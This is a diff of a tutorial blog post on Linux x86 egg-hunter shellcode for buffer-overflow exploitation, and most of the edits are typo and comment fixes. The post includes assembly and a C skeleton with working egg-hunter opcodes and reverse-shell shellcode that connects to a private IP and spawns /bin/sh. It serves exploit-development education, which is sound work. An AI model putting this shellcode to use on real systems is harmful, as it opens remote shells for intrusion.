@@ -11,8 +11,7 @@ toc: true
 
 ## Introduction ##
 
-Egg Hunter is super useful and simple piece of code used to search for an defined series of bytes called "egg" in a memory.  
-Egg as such is just a 4 bytes string, usually: "w00t" (but it can be anything else unique) which is added twice as prefix to a shellcode and thus marks beggining of a shell code.  
+Egg Hunter is super useful and simple piece of code used to search for an defined series of bytes called "egg" in a memory. Egg as such is just a 4 bytes string, usually: "w00t" (but it can be anything else unique) which is added twice as prefix to a shellcode and thus marks beggining of a shell code.  
 Egg Hunter is used in situation when buffer overflow vulnerability provides limited space, not large enough for placing shell code, but still shell code ends up somehow, somewhere in a memory.  
 For example, HTTP header can be vulnerable to buffer overflow but useful buffer is not large enought to hold shell code so instead shell code can can be delivered as payload within POST parameters of the same request etc.   
 Instead of direct execution of shellcode at first Egg Hunter is executed which searches for a egg in a memory and once it founds egg (two instances of egg: w00tw00t) it passes execution to a shellcode located just after the egg.  
@@ -22,10 +21,10 @@ Egg is appended twice as prefix to shell code in order to prevent Egg Hunter to 
 
 We could write Egg Hunter in pseudo code as follows:
 ```
-egg = "w00t"
-x = 0 # starting memory location
+egg = "w00t"                              # define egg
+x = 0                                     # starting memory location 
 
-While(True):
+While(True):                              # loop - which is running until 2 eggs are found
   if read(4 bytes at x) == egg:           # read 4 bytes and compare to egg (w00t)
     if read(4 bytes at x+4) == egg:       # if first 4 bytes are eaqual to egg, read next 4 bytes
       execute x+8                         # if another occurance of egg is found, pass execution to x+8 (shell code location)
@@ -36,9 +35,9 @@ While(True):
 ## Egg Hunter - first attempt ##
 
 Let's write basic Egg Hunter in assembly code based on prototype and see what will happen. Once Egg Hunter is compiled and liked, we can use Egg Hunter opcode with sekelton code from previous blog posts.
-In order for Egg Hunter to find and execute shell code (we used reverse shell code from previous blog post) we need to add two instances of egg ```\x77\x30\x30\x74``` at the beggining of shell code.
+In order for Egg Hunter to find and execute shell code (reverse shell code from previous blog post was used) we need to add two instances of egg ```\x77\x30\x30\x74``` at the beggining of shell code.
 
-* Assemlby code is following: *
+* Assemlby code is following:
 
 ```
 global _start
@@ -61,14 +60,14 @@ NEXT_ADDRESS:                   ; label used for looping
 
 ``` 
 
-* Skeleton code with Egg Hunter and reverse shell is following: *
+* Skeleton code with Egg Hunter and reverse shell is following:
 
 ```
 #include <stdio.h>
 
 unsigned char egghunter[] = "\x31\xd2\x42\x81\x3a\x77\x30\x30\x74\x75\xf7\x81\x7a\x04\x77\x30\x30\x75\xee\x83\xc2\x08\xff\xe2";
 unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
-// egg -----------------------^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+// 2 x egg -------------------^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 int main()
 {
@@ -134,7 +133,7 @@ To mitigate this issue, there are few possible solutions. Solution we will imple
 
 From the `man 2 access` pages we can see that access syscall takes two arguments and checks if calling process can access file pathname. 
 At first it seams non usefull to us, but the thing is, access syscall can also accept memory address instead of file pathname and as such can verify if user can access memory location.  
-Based on the return value (stired in EAX register), we can conclude if program can access memory location withoud causing segmentation fault. 
+Based on the return value (stored in EAX register), we can conclude whether program can access memory location without causing segmentation fault. 
 
 ```
 int access(const char *pathname, int mode);
@@ -200,8 +199,8 @@ int main()
 }
 ```
   
-By using GDB it can be concluded that checking access to only address stored in EDX is not always enough as current address in EDX can be accessible to Egg Hunter but EDX+8 may not be accessible.  
-To mitigate this issue we can verify if EDX is accessible and if EDX+8 is accessible.  
+By using GDB it can be concluded that checking access to only address stored in EDX is not always enough as current address in EDX can be accessible to Egg Hunter but EDX+8 address may not be accessible.  
+To mitigate this issue we can verify if address from EDX is accessible and if address EDX+8 is also accessible.  
 Next attempt...
 
 ```
@@ -324,6 +323,7 @@ In order to make Egg Hunter configurable to various shell codes and eggs we can 
 
 ## References ##
 
+* [Skape - Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
 * [Corlean - exploit writing tutorial](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)
 * [Art from code blog](https://artfromcode.wordpress.com/2018/03/23/slae-assignment-3-the-egg-hunter/)
 * [IllegalBytes blog](https://illegalbytes.com/2018-03-20/slae-assignment-3-linux-x86-egghunting/)
